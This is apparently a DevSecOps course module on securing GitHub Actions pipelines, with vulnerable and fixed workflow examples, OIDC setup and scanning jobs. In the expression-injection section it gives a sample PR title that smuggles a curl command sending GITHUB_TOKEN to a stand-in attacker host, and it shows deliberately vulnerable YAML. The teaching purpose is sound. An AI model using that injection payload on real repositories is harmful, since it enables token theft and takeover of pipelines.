# DevSecOps Pipeline Security — Securing the Code-to-Cluster Path

> **Module 09 · Course 38** — Attackers have figured out that the deployment pipeline is often the weakest link. It has cluster access, cloud credentials, and runs arbitrary code from pull requests. This module covers every attack vector from expression injection in GitHub Actions to stolen build secrets, and the controls that stop them.

---

## Why CI/CD Is a High-Value Target

The CI/CD pipeline has everything an attacker wants:
- Cluster credentials (to deploy to prod)
- Cloud IAM credentials (to push images, access storage)
- Database secrets (for integration tests)
- Access to ALL branches and pull requests
- Runs code that can be influenced by external PRs

```
Attacker's perspective:
  Compromise one CI/CD pipeline
        │
        ├──► Read all CI secrets (K8s tokens, cloud creds)
        │
        ├──► Modify deployments to inject backdoors
        │
        ├──► Access source code and intellectual property
        │
        └──► Use the pipeline to deploy malicious code to production
```

The pipeline is essentially a privileged pod that runs code you don't fully control.

---

## GitHub Actions Architecture

```
GitHub.com
  │
  │  PR/push event triggers workflow
  ▼
Workflow YAML (.github/workflows/deploy.yml)
  │
  │  Runs on GitHub-hosted runner (or self-hosted)
  ▼
Runner Environment:
  - Container with checkout of repo
  - ACTIONS_RUNTIME_TOKEN (temporary GitHub token)
  - GitHub Secrets injected as env vars
  - OIDC token available for cloud auth
  │
  │  Jobs execute steps:
  │  - Checkout code
  │  - Build image
  │  - Push to registry
  │  - Deploy to K8s cluster
  ▼
Result: code deployed to production
```

The workflow has two trust boundaries:
1. **Code trust**: what code runs in the job
2. **Data trust**: what data flows into the job (PR title, commit message, issue body)

Both are attack surfaces.

---

## Attack 1: Expression Injection

GitHub Actions expressions evaluate `${{ }}` syntax inside workflow YAML. If attacker-controlled data flows into an expression, they can inject arbitrary commands.

```yaml
# VULNERABLE workflow:
name: PR Comment
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
    - name: Post greeting
      run: |
        echo "Hello ${{ github.event.pull_request.title }}"
        # ^ VULNERABILITY: PR title is attacker-controlled
```

If an attacker opens a PR with this title:
```
My Feature"; curl -s https://attacker.io/steal?token=$GITHUB_TOKEN; echo "
```

The expanded workflow step becomes:
```bash
echo "Hello My Feature"; curl -s https://attacker.io/steal?token=$GITHUB_TOKEN; echo ""
```

This exfiltrates the `GITHUB_TOKEN` to the attacker's server. With the token, the attacker can:
- Push code to any branch
- Access any repository the token has permission to
- Trigger other workflows
- Access CI secrets

```yaml
# SAFE: Use an environment variable instead of inline expression
steps:
- name: Post greeting
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Hello $PR_TITLE"
    # ^ PR title is now in an env var — not evaluated as shell
    # Even if PR title contains ";curl...", it's just a string value
```

The rule: **never use `${{ }}` expressions directly in `run:` steps where the value is attacker-controlled.** Use `env:` to sanitize.

---

## Attack 2: `pull_request_target` Abuse

`pull_request_target` runs with write permissions and secrets in the context of the BASE branch — even when triggered by a fork PR. This is legitimately useful for leaving comments on PRs from forks, but dangerous if the job also checks out the PR's code.

```yaml
# EXTREMELY DANGEROUS combination:
on:
  pull_request_target:  # Runs with secrets from base branch

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        # ^ Checks out the FORK's code (attacker-controlled)
    - run: ./run-tests.sh
        # ^ Runs the fork's code WITH the base branch's secrets
        # Attacker controls run-tests.sh → can read $KUBECONFIG, $AWS_SECRET_ACCESS_KEY, etc.
```

Fix: never check out the PR head in a `pull_request_target` job that has secrets. Split into two jobs — one for testing (no secrets, uses `pull_request`) and one for deploying (has secrets, never runs fork code).

---

## Attack 3: Third-Party Action Compromise

Using `actions/checkout@v3` pins to a tag. Tags are mutable — a compromised third-party action can steal your secrets.

```yaml
# VULNERABLE:
- uses: actions/setup-node@v4
  # ^ If the upstream maintainer's account is compromised,
  # v4 tag can be moved to malicious code

# SAFE — pin to full SHA:
- uses: actions/setup-node@cdca7365b2dadb8aad0a33bc7601856ffabcc48e
  # ^ Immutable. Can never be changed without changing the YAML.
```

You can also use Dependabot to keep SHA pins up to date:

```yaml
# .github/dependabot.yml
updates:
- package-ecosystem: "github-actions"
  directory: "/"
  schedule:
    interval: "weekly"
```

---

## Attack 4: Secrets in Logs

```yaml
# DANGEROUS:
- name: Deploy
  run: |
    kubectl apply -f deployment.yaml
    echo "Using token: $KUBECONFIG_TOKEN"  # ← Logged in CI output
    # GitHub masks known secrets, but custom secrets or dynamic ones may not be masked
```

GitHub automatically masks values of secrets defined in `env:`. But if you:
- Build a secret dynamically and don't use `::add-mask::`, it's logged
- Use `set -x` in a shell script that runs with secrets — all commands logged
- Log an HTTP response that happens to contain credentials

```yaml
# Safe logging practices:
- name: Deploy
  run: |
    # Mask any dynamically derived secrets:
    TOKEN=$(vault read -field=token secret/deploy-token)
    echo "::add-mask::$TOKEN"   # GitHub will now redact this value in all logs
    
    # Avoid set -x in scripts that handle secrets
    # Redirect Vault/kubectl output to /dev/null for secret operations
```

---

## Securing the Pipeline: OpenID Connect (OIDC)

The best practice: **no stored secrets at all.** Use OIDC to have the CI runner authenticate directly to cloud providers using a short-lived JWT.

```yaml
# GitHub Actions OIDC → AWS:
permissions:
  id-token: write   # Required to request OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - name: Configure AWS credentials via OIDC
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
        aws-region: us-east-1
        # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY stored as secrets
        # GitHub generates a JWT, AWS verifies it, issues temp credentials
```

```
How OIDC works in CI:
  1. GitHub generates a JWT for the job:
     {"sub": "repo:org/repo:ref:refs/heads/main",
      "aud": "sts.amazonaws.com",
      "iss": "https://token.actions.githubusercontent.com", ...}
  2. GitHub signs it with their private key
  3. The job sends this JWT to AWS STS AssumeRoleWithWebIdentity
  4. AWS verifies the JWT signature against GitHub's published JWKS
  5. AWS returns temporary credentials valid for the job's duration
  6. No permanent credentials exist → nothing to steal
```

The AWS IAM role trust policy for OIDC:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
        // ^ Only the main branch of my-repo can assume this role
      }
    }
  }]
}
```

---

## SAST, DAST, and SCA in the Pipeline

> Note: Course 30 covers SBOM, cosign, and supply chain security in depth. This section focuses on the pipeline integration aspects.

```yaml
# .github/workflows/security.yml — Security scanning pipeline
name: Security Scan
on: [push, pull_request]

jobs:
  sast:
    name: Static Analysis
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@cdca7365b2dadb8aad0a33bc7601856ffabcc48e
    - name: Run Semgrep
      uses: semgrep/semgrep-action@v1
      with:
        config: >-
          p/security-audit
          p/secrets
          p/owasp-top-ten
        auditon: pr
      env:
        SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

  container-scan:
    name: Container Image Scan
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@cdca7365b2dadb8aad0a33bc7601856ffabcc48e
    - name: Build image
      run: docker build -t myapp:${{ github.sha }} .
    - name: Scan with Trivy
      uses: aquasecurity/trivy-action@2b6a709cf9c4025c5438138008beaddbb02086f0
      with:
        image-ref: myapp:${{ github.sha }}
        format: sarif
        output: trivy-results.sarif
        severity: HIGH,CRITICAL
        exit-code: 1   # Fail the pipeline on HIGH/CRITICAL CVEs

  secret-scan:
    name: Secret Scanning
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@cdca7365b2dadb8aad0a33bc7601856ffabcc48e
      with:
        fetch-depth: 0   # Full history for Gitleaks
    - name: Gitleaks
      uses: gitleaks/gitleaks-action@v2
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## Securing Kubernetes Access from CI

```yaml
# Pattern 1: Use OIDC + kubectl
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
    - name: Get AWS creds via OIDC
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/github-deploy
        aws-region: us-east-1
    
    - name: Configure kubectl for EKS
      run: |
        aws eks update-kubeconfig --name prod-cluster --region us-east-1
        # Kubeconfig uses the OIDC-derived temp AWS creds — not a stored kubeconfig
    
    - name: Deploy
      run: kubectl apply -f manifests/

# Pattern 2: Dedicated deployment ServiceAccount (least-privilege)
# Create a SA with only deploy permissions:
# kubectl create sa ci-deploy -n production
# kubectl create rolebinding ci-deploy \
#   --clusterrole=deploy-role \
#   --serviceaccount=production:ci-deploy
# Generate a short-lived token: kubectl create token ci-deploy --duration=1h
```

---

## Pipeline Attack Surface Map

```
┌─────────────────── GitHub Actions Pipeline ──────────────────────┐
│                                                                   │
│  Source code ──► Triggered by PR/push                            │
│        │                │                                        │
│        │         Attack surface:                                 │
│        │         ├── Expression injection (PR title/body)        │
│        │         ├── pull_request_target + fork checkout         │
│        │         └── Malicious third-party action                │
│        │                                                         │
│        ▼                                                         │
│  Build stage ──► docker build                                    │
│        │                                                         │
│        │         Attack surface:                                 │
│        │         ├── Malicious base image                        │
│        │         ├── Compromised package registry                │
│        │         └── Dockerfile ADD/COPY from untrusted URL      │
│        │                                                         │
│        ▼                                                         │
│  Scan stage ──► Trivy + Semgrep + Gitleaks                       │
│                                                                  │
│        ▼                                                         │
│  Push to registry ──► AWS ECR / GHCR                            │
│        │                                                         │
│        │         Attack surface:                                 │
│        │         ├── Stored registry credentials                 │
│        │         └── Unsigned image → tampered in transit        │
│        │                                                         │
│        ▼                                                         │
│  Deploy to K8s ──► kubectl apply                                 │
│                                                                  │
│                    Attack surface:                               │
│                    ├── Stored KUBECONFIG with cluster-admin      │
│                    ├── Overly permissive CI ServiceAccount       │
│                    └── No admission controller check at deploy   │
└───────────────────────────────────────────────────────────────── ┘
```

---

## Checkpoint

You're ready for Module 10 when you can answer:

1. What is expression injection in GitHub Actions, and what makes `run:` steps particularly vulnerable?
2. What is the difference between `pull_request` and `pull_request_target` triggers in terms of security?
3. Why is pinning third-party actions to a full commit SHA safer than pinning to a tag?
4. How does OIDC eliminate the need to store cloud credentials as CI secrets?
5. Write the fix for this vulnerable step: `run: echo "PR title is ${{ github.event.pull_request.title }}"`
6. What does `echo "::add-mask::$TOKEN"` do in a GitHub Actions step?
7. What is `set -x` in a shell script and why is it dangerous when secrets are present?
8. What is the minimum AWS IAM trust policy condition that restricts OIDC access to only the `main` branch of a specific repo?
9. What does `exit-code: 1` in a Trivy scan step do, and why is it important for security gates?
10. Name three places in a CI/CD pipeline where credentials could be accidentally logged.

➡ Next: **Policy as Code: OPA Gatekeeper + Kyverno** — enforcement at admission time, before anything runs.
